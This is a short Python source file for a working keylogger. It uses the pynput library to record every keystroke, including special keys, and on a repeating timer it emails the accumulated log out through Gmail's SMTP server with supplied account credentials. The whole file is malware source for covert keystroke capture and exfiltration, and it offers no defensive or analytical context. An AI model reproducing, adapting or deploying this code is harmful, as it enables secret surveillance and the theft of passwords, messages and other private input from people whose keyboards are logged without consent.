import smtplib
import threading
import pynput
from pynput import keyboard

# Create Keylogger Class
class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Append keystrokes to the log
    def append_to_log(self, string):
        self.log = self.log + string

    # Capture each key press
    def on_press(self, key):
        try:
            current_key = str(key.char)  # Capture normal key presses
        except AttributeError:
            if key == key.space:
                current_key = " "  # Treat spacebar as space
            elif key == key.esc:
                print("Exiting program...")
                return False  # Stop the keylogger when escape key is pressed
            else:
                current_key = " " + str(key) + " "  # Handle special keys (e.g., shift, ctrl)

        self.append_to_log(current_key)

    # Function to send emails with the captured logs
    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587) 
        server.starttls()  # Should automatically start TLS with this port
        server.login(email, password)
        server.sendmail(email, email, message)  # Send email to yourself with the log
        server.quit()

    # Function to periodically send the log via email
    def report_n_send(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)  # Send the current log
        self.log = ""  # Reset the log after sending
        timer = threading.Timer(self.interval, self.report_n_send)  # Schedule next email
        timer.start()

    # Start the keylogger
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)  # Capture key presses
        with keyboard_listener:
            self.report_n_send()  # Start the email reporting
            keyboard_listener.join()  # Keep the keylogger running